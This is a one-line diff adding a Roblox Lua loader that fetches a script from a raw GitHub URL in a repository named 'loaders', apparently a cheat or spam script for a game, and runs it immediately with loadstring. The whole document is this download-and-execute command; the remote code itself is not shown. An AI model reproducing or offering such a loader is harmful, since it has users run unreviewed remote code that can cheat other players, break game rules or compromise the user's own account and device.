@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SnatchJailer/loaders/main/loaders/chop-a-forest-spam2-njac5g4cn6003k.lua"))()
